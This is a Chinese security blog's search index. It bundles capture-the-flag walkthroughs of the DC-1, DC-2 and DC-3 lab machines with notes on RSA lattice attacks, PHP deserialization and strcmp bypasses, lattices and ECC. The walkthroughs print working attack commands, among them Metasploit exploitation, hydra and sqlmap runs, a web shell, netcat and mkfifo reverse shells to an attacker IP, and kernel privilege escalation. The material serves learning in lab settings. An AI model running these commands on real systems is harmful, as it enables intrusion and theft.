<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>DC-1</title>
    <link href="/2021/05/28/DC-1/"/>
    <url>/2021/05/28/DC-1/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sP 192.168.93.0/24#扫描局域网内的ip确定主机<br>nmap -sV 192.168.93.79#扫描靶机开方的端口<br></code></pre></td></tr></table></figure><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501205243182.png" alt="image-20210501205243182" style="zoom:150%;" /><p>发现开放三个端口，我们先访问80端口。</p><p>看到了Drupal,启动msfconsole,并寻找相关攻击模块。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfconsole<br>search Drupal<br></code></pre></td></tr></table></figure><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501210326675.png" alt="image-20210501210326675" style="zoom:67%;" /><p>选择最新的模块进行攻击。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">use exploit/unix/webapp/drupal_drupalgeddon2<br>set RHOST 192.168.93.79<br>run<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501210651791.png" alt="image-20210501210651791"></p><p>拿到meterpreter会话,列出当前文件，发现flag1.txt。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls<br>cat flag1.txt<br></code></pre></td></tr></table></figure><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501211042144.png" alt="image-20210501211042144" style="zoom:150%;" /><p>根据该提示，我们去查询相关配置文件，Drupal的配置文件存于 ./sites/default/settings.php</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501211638214.png" alt="image-20210501211638214"></p><p>拿到flag2，同时发现数据库账号和密码。</p><p>输入shell切换壳。</p><p>登陆数据库发现没有回显，可能是因为不是交互式shell。</p><p>利用python触发交互示shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>登陆数据库。</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501212835144.png" alt="image-20210501212835144"></p><p>进入数据库drupaldb,查表，进入users,再把东西都列出来，发现admin和其密码。</p><p>修改admin密码:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php scripts/password-hash.sh 123456#返回shell输入<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update users set pass&#x3D;&quot;$S$D0EhkXn49TFszpwkBNaPbktisjrdSzUqOwL3pbTcUZ5YfsCyd4Q0&quot; where uid&#x3D;1;#mysql登陆数据库后使用<br></code></pre></td></tr></table></figure><p>修改后登陆网站，找到flag3</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501221735813.png" alt="image-20210501221735813"></p><p>根据提示返回终端，查找相关文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501222739893.png" alt="image-20210501222739893"></p><p>这里的flag应该是一个用户，之前扫描端口有一个ssh服务的端口，猜测用该需要用ssh登陆该用户，但不知道密码，所有需要爆破。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -l flag4 -P /usr/share/john/password.lst 192.168.78.147 ssh -vV -f<br></code></pre></td></tr></table></figure><p>得到密码为orange，进行ssh连接。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh flag4@192.168.93.79<br></code></pre></td></tr></table></figure><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501223520505.png" alt="image-20210501223520505" style="zoom:150%;" /><p>根据提示得知flag可能在root目录下，但尝试进入失败。</p><p>查看当前用户</p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501223759447.png" alt="image-20210501223759447" style="zoom: 200%;" /><p>想办法提升为root。</p><p>这里使用SUID提权。</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501224206065.png" alt="image-20210501224206065"></p><p>成功提升为root用户。</p><p>最后找到flag。</p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501224354960.png" alt="image-20210501224354960" style="zoom:150%;" />]]></content>
    
    
    <categories>
      
      <category>redteam</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-web -DC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>基于格的通用私钥攻击</title>
    <link href="/2021/05/28/%E5%9F%BA%E4%BA%8E%E6%A0%BC%E7%9A%84%E9%80%9A%E7%94%A8%E7%A7%81%E9%92%A5%E6%94%BB%E5%87%BB%EF%BC%88RSA%E7%94%A8%E4%BA%86%E5%90%8C%E4%B8%80%E4%B8%AAd%EF%BC%89/"/>
    <url>/2021/05/28/%E5%9F%BA%E4%BA%8E%E6%A0%BC%E7%9A%84%E9%80%9A%E7%94%A8%E7%A7%81%E9%92%A5%E6%94%BB%E5%87%BB%EF%BC%88RSA%E7%94%A8%E4%BA%86%E5%90%8C%E4%B8%80%E4%B8%AAd%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="基于格的通用私钥攻击（RSA用了同一个d）"><a href="#基于格的通用私钥攻击（RSA用了同一个d）" class="headerlink" title="基于格的通用私钥攻击（RSA用了同一个d）"></a>基于格的通用私钥攻击（RSA用了同一个d）</h1><p>假设现在有r组n,e，他们的私钥均为d，则有：</p><p><strong>e<sub>1</sub>*d = k<sub>1</sub>*phi(N<sub>1</sub>) + 1</strong> </p><p><strong>e<sub>2</sub>*d = k<sub>2</sub>*phi(N<sub>2</sub>) + 1</strong></p><p>​     <strong>. . .</strong></p><p>*<em>e<sub>r</sub><em>d = k<sub>r</sub>*phi(N<sub>3</sub>) + 1</em></em></p><p>此处默认（N<sub>1</sub> &lt; N<sub>2</sub> &lt; … &lt; N<sub>r</sub> &lt; 2N<sub>r</sub> ）</p><p>令 M = [N<sub>r</sub><sup>1/2</sup> ]</p><p> phi(N<sub>r</sub> )= N<sub>i</sub> - s<sub>i</sub> 且k<sub>i</sub> &lt; d (i = 1,2,…,r)</p><p>则有：e<sub>i</sub>*d - N<sub>i</sub>*k<sub>i</sub> = 1 - k<sub>i</sub>*s<sub>i</sub>  </p><p>可以列出下列等式：</p><p>​            <strong>dM = dM</strong></p><p><strong>e<sub>1</sub>*d - N<sub>1</sub>*k<sub>1</sub> = 1 - k<sub>1</sub>*s<sub>1</sub></strong></p><p><strong>e<sub>2</sub>*d - N<sub>2</sub>*k<sub>2</sub> = 1 - k<sub>2</sub>*s<sub>2</sub></strong></p><p>​    <strong>. . .</strong></p><p><strong>e<sub>r</sub>*d - N<sub>r</sub>*k<sub>r</sub> = 1 - k<sub>r</sub>*s<sub>r</sub></strong></p><p>可以构造<br>$$<br>x_r*B_r = v_r\<br>x_r = (d,k_1,k_2,…,k_r)<br>$$</p><p>$$<br>B_r =<br>\begin{bmatrix}<br>{M}&amp;{e_1}&amp;{\cdots}&amp;{e_r}\<br>{0}&amp;{-N_1}&amp;{\cdots}&amp;{0}\<br>{\vdots}&amp;{\vdots}&amp;{\ddots}&amp;{\vdots}\<br>{0}&amp;{0}&amp;{\cdots}&amp;{-N_r}\<br>\end{bmatrix}\<br>vr = (dM,1-k_1<em>s_1,…,1-k_r</em>s_r)<br>$$<br>而后对B<SUB>r</SUB> 使用LLL算法得到向量b,最后<br>$$<br>d = \frac{|b|}{M}<br>$$</p>]]></content>
    
    
    <categories>
      
      <category>knowledge-crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Crypto -RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化</title>
    <link href="/2021/05/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/05/28/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>为了能够跨平台存贮，有时候我们会将对象的信息转化为可以存储或传输的形式，这就是序列化（比如json），相应的，我们把数据恢复回来，就叫反序列化。</p><p><strong>php相关函数：</strong></p><p>serialize() 返回一个包含字节流的字符串，序列化对象返回的字符串似乎与其打印出的字符串有所不同。（可能有部分内容没有显示，似乎是两个字符的差异，所以修改时建议使用str_replace()）</p><p>unserialize() 重新把字符串恢复成原来的值【相当于反序列化】</p><p><em>ps:序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。为了能够<a href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中反序列化一个对象，这个对象的类必须在反序列化之前定义，可以通过包含一个定义该类的文件或使用函数<a href="https://www.php.net/manual/zh/function.spl-autoload-register.php">spl_autoload_register()</a>来实现</em>。</p><p>__wakeup()绕过：</p><p>（PHP5&lt;5.625&amp;&amp;PHP7&lt;7.0.10）</p><p><code>__wakeup</code>触发于<code>unserilize()</code>调用之前，但是如果被反序列化的对象的个数小于指定个数时，虽然会反序列化但不会触发<code>__wakeup</code>。</p><p>private修饰变量的序列化的类名和字段名前面要加空，可用%00修饰</p><p>protected修饰变量的序列化的字段名前要加%00*%00</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-web -PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php strcmp()函数漏洞</title>
    <link href="/2021/05/28/php%20strcmp()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/05/28/php%20strcmp()%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="php-strcmp-函数漏洞"><a href="#php-strcmp-函数漏洞" class="headerlink" title="php strcmp()函数漏洞"></a>php strcmp()函数漏洞</h1><p><em>php&lt;5.3</em></p><p>strcmp()接受两个string类型,但如果接受了错误的类型，函数会发生错误，但是在5.3之前的php中，显示了报错的警告信息后，函数将return 0，也就是虽然报了错，但却判定其相等。</p><p>绕过该函数时使其接受对象为数组或对象。</p><p>我们在post数据时，php为了可以上传一个数组，会把结尾带一对中括号的变量</p><p>如a[]=123,此处其实上传了一个数组。【服务器端代码应有$_POST[‘a’]】</p><p>而strcmp()中若直接或间接接受了这个post上去的a，我们就绕过了他（直接判定相等。）</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-web -PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-3</title>
    <link href="/2021/05/28/DC-3/"/>
    <url>/2021/05/28/DC-3/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><p>nmap扫出靶机及其端口，框架，而后在浏览器上访问。</p><p>提示只有一个flag，且需要root权限。</p><p>框架为joomla，在msfconsole上找到对应模块逐一尝试，没能成功，但成功找到了对应版本号3.7.0</p><p>在网络上继续搜索相应漏洞，发现该版本有对应的sql注入漏洞，回到浏览器进行尝试，而后注入得到数据库名。</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210503175057935.png" alt="image-20210503175057935"> </p><p>再次使用joomscan工具进行扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">perl joomscan.pl --url http://192.168.101.23<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210503183623742.png" alt="image-20210503183623742"></p><p>发现一些页面。</p><p>寻找对应版本的模块。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit joomla 3.7<br>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt<br></code></pre></td></tr></table></figure><p>复制sql注入命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u &quot;http://192.168.101.23/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]#查询数据库<br>sqlmap -u &quot;http://192.168.101.23/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --current-db -p list[fullordering]#查询表名<br>sqlmap -u &quot;http://192.168.101.23/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns  -p list[fullordering]#查询表中所有列<br></code></pre></td></tr></table></figure><p>查询到用户为admin，密码为一串hash值，那么对hash值进行爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim hashpassword.txt#将hash值写入该文件<br>john hashpassword.txt#爆破hash值<br></code></pre></td></tr></table></figure><p>而后获得密码snoopy，进行登录，并找到模板相关的页面，发现可以创建文件，直接给他来个一句话木马。</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210503234340411.png" alt="image-20210503234340411"></p><p>那么我们现在需要的就是找到shell.php的位置并进行连接。</p><p>之前使用joomscan扫出的目录里有templates，前面的administrator应该只是登陆页面，所以猜测真正的文件路径是<a href="http://192.168.101.23/templates/beez3/html/shell.php">http://192.168.101.23/templates/beez3/html/shell.php</a> (beez3的猜测是因为进入文件夹的时候经过了)。</p><p>蚁剑连接，但蚁剑的连接只是单向shell，我们需要进行交互式的shell，这样才能提到root权限。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc lvvp 1234#kali本机开启监听<br>nc -e /bin/bash 192.168.101.16 1234#靶机连接kali<br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.101.16 4444 &gt;/tmp/f#靶机输入，反弹shell完成。<br></code></pre></td></tr></table></figure><p>尝试SUID提权和git提权，但都失败了，之前登陆的网站中，有关于网站使用系统的信息，其中Ubuntu的版本是16.04</p><p>可以试着找找该版本的漏洞</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">searchsploit Ubuntu 16.04<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210504001644530.png" alt="image-20210504001644530"></p><p>这里选择39772进行提权，(该文件说明时提到了可以用于获得root权限)s。</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210504002150716.png" alt="image-20210504002150716"></p><p>下载payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip<br>cp 39772.zip /var/www/html<br>service apache2 start<br></code></pre></td></tr></table></figure><p>而后靶机就可以从kali这下载了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">wget http://192.168.101.16/39772.zip<br>unzip 39772.zip<br>cd 39772<br>tar -xvf exploit.tar<br></code></pre></td></tr></table></figure><p>再从主机进行操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd 39772<br>cd ebpf_mapfd_doubleput_exploit<br>./compile.sh<br>./doubleput#到这里已经获得了root权限<br>cd /root<br>cat the-flag.txt<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210504010206993.png" alt="image-20210504010206993"></p>]]></content>
    
    
    <categories>
      
      <category>redteam</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-web -DC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC-2</title>
    <link href="/2021/05/28/DC-2/"/>
    <url>/2021/05/28/DC-2/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p>先扫描当前网段下的ip确定靶机。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sP 192.168.93.0/24<br></code></pre></td></tr></table></figure><p>扫描靶机开放的端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sV 192.168.93.152<br></code></pre></td></tr></table></figure><p>发现开放80端口，用浏览器进行访问</p><p>发现ip地址被直接转成了dc-2，而且无法访问，页面显示无法解析出ip地址</p><p>进入kali下的/etc/hosts,在末尾加上192.168.93.152 dc-2即可。</p><p>再次访问页面，可以正常访问。</p><p>拿到flag1</p><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210501230235415.png" alt="image-20210501230235415"></p><p>这里再次用nmap进行扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sS -Pn -A -p 1-65535 192.168.239.152<br></code></pre></td></tr></table></figure><p>发现还扫出来一个7744端口，运行了ssh服务。</p><p>flag1提示cewl，同时wordpress也是一种框架，可以寻找相关工具。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">wpscan --url http://dc-2 --enumerate u#扫描关于wordpress的相关漏洞<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210502210311471.png" alt="image-20210502210311471"></p><p>发现了三个用户。</p><p>但并不知道密码，这里查询cewl用法，使用cewl生成密码。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cewl -w 555.txt http://dc-2<br></code></pre></td></tr></table></figure><p>再将用户写入txt文件，开始准备爆破ssh用户。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">hydra -L 444.txt -P 555.txt ssh://192.168.239.152 -s 7744 -vV指定7744端口ssh爆破用户名和密码。<br>wpscan --url http://dc-2/ -e u -U 444.txt -P 555.txt #这个也能爆。<br></code></pre></td></tr></table></figure><p>登陆tom用户：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ssh tom@192.168.239.152 -p 7744<br></code></pre></td></tr></table></figure><p>发现是rbash，部分命令受限，绕过rbash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">BASH_CMDS[a]=/bin/sh;a<br>export PATH=$PATH:/bin/<br>export PATH=$PATH:/usr/bin<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls<br>cat flag3.txt<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210502223740131.png" alt="image-20210502223740131"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">su jerry<br>cd /home/jerry<br>ls<br>cat flag4.txt<br></code></pre></td></tr></table></figure><p>根据提示联想git提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo -l#查看sudo配置文件<br>sudo git help config#git提权<br>cd /root<br>ls<br>cat final-flag.txt<br></code></pre></td></tr></table></figure><p><img src="C:\Users\17709\AppData\Roaming\Typora\typora-user-images\image-20210502231015330.png" alt="image-20210502231015330"></p>]]></content>
    
    
    <categories>
      
      <category>redteam</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-web -DC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格相关</title>
    <link href="/2021/05/16/%E6%A0%BC%E7%9B%B8%E5%85%B3/"/>
    <url>/2021/05/16/%E6%A0%BC%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="格相关"><a href="#格相关" class="headerlink" title="格相关"></a>格相关</h1><h2 id="格的定义"><a href="#格的定义" class="headerlink" title="格的定义"></a>格的定义</h2><p>$$<br>{设线性无关向量组v_1,v_2,…,v_n \in R^m，该组向量生成的格L即是该组向量的线性组合的集合，\<br>且其系数a_1,a_2,…,a_n\in Z^n,即;L = {a_1v_1+a_2v_2+…+a_nv_n,a_n\in Z}}<br>$$</p><h3 id="与格相关的计算性问题"><a href="#与格相关的计算性问题" class="headerlink" title="与格相关的计算性问题"></a>与格相关的计算性问题</h3><p>$$<br>{;;;1.SVP(最短向量问题)：在格L中寻找一个最短的非零向量，即寻找一个非零向量v\in L使得其范数||v||最小。<br>}<br>\<br>{2.CVP(在格中寻找与指定非格向量最为接近的向量)：对于一个不在格中的向量w,寻找一个向量v\in L使得\<br>||w-v||最小}<br>$$</p><h2 id="LLL算法"><a href="#LLL算法" class="headerlink" title="LLL算法"></a>LLL算法</h2><p>可以求解SVP问题<br>$$<br>输入一组格的基b_1,b_2,…,b_n \in Z^n进行下列计算\<br>{for;i=2;to;n;do}\<br>\qquad\qquad for;j=i-1;to;do\<br>\qquad\qquad\qquad\qquad\qquad\qquad\qquad<br>b_i = b_i-c_i,_jb_j ;（c_i,_j=[\frac{\langle b_i,b^*_j\rangle}{\langle b^*_j,b^*_j\rangle}]）\<br>{而后进行比对，如果;\delta ||b^*_i||&gt;||\mu _{i+1},<em>ib^*<em>i+b^*</em>{i+1}||\<br>则交换b_i和b</em>{i+1}的值，并回到第一步。\<br>最后输出b_1,b_2,…,b_n。}<br>$$<br>我的理解就是先对这组基做一个施密特正交化，并记下正交化时向量前的系数，而后对输入的基做一个变幻，从第二个开始每个向量减去前面所有的向量与其对应‘系数’的乘积的和，再看看是否满足所需条件。满足就进行交换而后回到开始再来一遍。</p>]]></content>
    
    
    <categories>
      
      <category>knowledge-crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Crypto -Lattice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ECC</title>
    <link href="/2021/03/31/ECC/"/>
    <url>/2021/03/31/ECC/</url>
    
    <content type="html"><![CDATA[<h1 id="ECC椭圆加密曲线"><a href="#ECC椭圆加密曲线" class="headerlink" title="ECC椭圆加密曲线"></a>ECC椭圆加密曲线</h1><h2 id="椭圆曲线的定义"><a href="#椭圆曲线的定义" class="headerlink" title="椭圆曲线的定义"></a>椭圆曲线的定义</h2><p>Z<sub>p</sub>(p&gt;3)上的椭圆曲线指满足以下条件的所有对(x,y) ∈ Z<sub>p</sub> 的集合：</p><p>​                y<sup>2</sup> ≡ x<sup>3</sup> + a*x + b mod p</p><p>以及一个无穷大的虚数点此处记为G，其中（a,b）∈ Z<sub>p</sub></p><p>且满足条件4*a<sup>3</sup> + 27*b<sup>2</sup> ≠ 0 mod p。</p><p><img src="https://i.loli.net/2021/04/19/a7mLQni4vqOW6BJ.png" alt="image-20210331001025785.png"></p><h2 id="椭圆曲线上的群操作"><a href="#椭圆曲线上的群操作" class="headerlink" title="椭圆曲线上的群操作"></a>椭圆曲线上的群操作</h2><p>可以用加法符号”+“来表示群操作，两点相“加”得到第三点</p><p>P + Q =R</p><p>即(x<sub>1</sub> , y<sub>1</sub> ) + (x<sub>2</sub> , y<sub>2</sub>) = (x<sub>3</sub> , y<sub>3</sub>)</p><p>两点相“加”的方式与这两点是否是相同点有关</p><h4 id="相异点连线的交点并关于X轴对称的点即为得到的点："><a href="#相异点连线的交点并关于X轴对称的点即为得到的点：" class="headerlink" title="相异点连线的交点并关于X轴对称的点即为得到的点："></a>相异点连线的交点并关于X轴对称的点即为得到的点：</h4><p><img src="https://i.loli.net/2021/04/19/Dg6SMByqOF28zhw.png" alt="image-20210331001246350.png"></p><h4 id="相同点切线的交点取对称："><a href="#相同点切线的交点取对称：" class="headerlink" title="相同点切线的交点取对称："></a>相同点切线的交点取对称：</h4><p><img src="https://i.loli.net/2021/04/19/pFY2QxdetEqJIbf.png" alt="image-20210331001501795.png"></p><p>其坐标点的关系：</p><p>$$<br>x_3 = s^2 - x_1 - x_2;mod;p\<br>y_3 = s(x_1 - x_3) - y_1;mod;p\<br>;\<br>其中s的值会因情况不同而变化\<br>;\<br>s=\left{<br>\begin{array}{c}<br>\frac {y_2 - y_1}{x_2 - x_1};mod;p;;P≠Q\<br>\frac{3x^2_1 + a}{2y_1};mod;p;;P=Q<br>\end{array}<br>\right.<br>$$<br>注意：P + G =P    P + (-P) = G </p><p>P(x<sub>p</sub> , y<sub>p</sub>)的逆元为-P(x<sub>p</sub> , -y<sub>p</sub>)，若在素数域上，则-P(x<sub>p</sub> , P-y<sub>p</sub>)</p><p>对于椭圆加密曲线的群操作，相当于把以前的群的数字变成了坐标点，群操作也只是变得稍微抽象了一些。</p><p>所以同样的，曲线上的点可以与G一起构成循环子群</p><p>假如一个群的阶数为X，那么X*P = G，（X+1）* P = P</p><p>相当于把之前的群的知识类比过来。</p><h4 id="自然而然我们就可以构建出基于椭圆曲线的离散对数问题："><a href="#自然而然我们就可以构建出基于椭圆曲线的离散对数问题：" class="headerlink" title="自然而然我们就可以构建出基于椭圆曲线的离散对数问题："></a>自然而然我们就可以构建出基于椭圆曲线的离散对数问题：</h4><h4 id="P-P-…-P-d-P-T"><a href="#P-P-…-P-d-P-T" class="headerlink" title="P + P + … +P = d*P =T"></a>P + P + … +P = d*P =T</h4><p>有了基于椭圆曲线的离散对数问题，我们自然也可以得到基于椭圆曲线的密钥交换：</p><h4 id="基于椭圆加密曲线的密钥交换"><a href="#基于椭圆加密曲线的密钥交换" class="headerlink" title="基于椭圆加密曲线的密钥交换"></a>基于椭圆加密曲线的密钥交换</h4><h5 id="ECDH域参数选取："><a href="#ECDH域参数选取：" class="headerlink" title="ECDH域参数选取："></a>ECDH域参数选取：</h5><p>1.素数p和椭圆曲线：</p><p>​                y<sup>2</sup> ≡ x<sup>3</sup> + a*x + b mod p</p><p>2.本原元P = (x<sub>p</sub> , y<sub>p</sub>) (此点可循环生成所有点)</p><h5 id="椭圆曲线-Diffie-Hellman-密钥交换（ECDH）："><a href="#椭圆曲线-Diffie-Hellman-密钥交换（ECDH）：" class="headerlink" title="椭圆曲线 Diffie-Hellman 密钥交换（ECDH）："></a>椭圆曲线 Diffie-Hellman 密钥交换（ECDH）：</h5><p>Alice:                                                                                       Bob:</p><p>选择k<sub>prA</sub> = a ∈ {2,3,…,#E-1}                             选择k<sub>prB</sub> = b ∈ {2,3,…,#E-1}</p><p>计算k<sub>pubA</sub> =aP =A = (x<sub>A</sub> , y<sub>A</sub>)                              计算k<sub>pubB</sub> = bP =B ∈(x<sub>B</sub> , y<sub>B</sub>)</p><p>​                                             A———–&gt;</p><p>​                                             &lt;————B</p><p>而后两人分别计算aB = T<sub>AB</sub>    ,    bA = T<sub>AB</sub></p><p>就得到了联合密钥：T（x<sub>AB</sub> , y<sub>AB</sub>）</p><p>（为了方便，图片都是从《深入浅出密码学》这本书上拍的，不过也推荐一下这本书。）</p>]]></content>
    
    
    <categories>
      
      <category>knowledge-crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-Crypto -ECC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LFSR</title>
    <link href="/2021/03/31/LFSR/"/>
    <url>/2021/03/31/LFSR/</url>
    
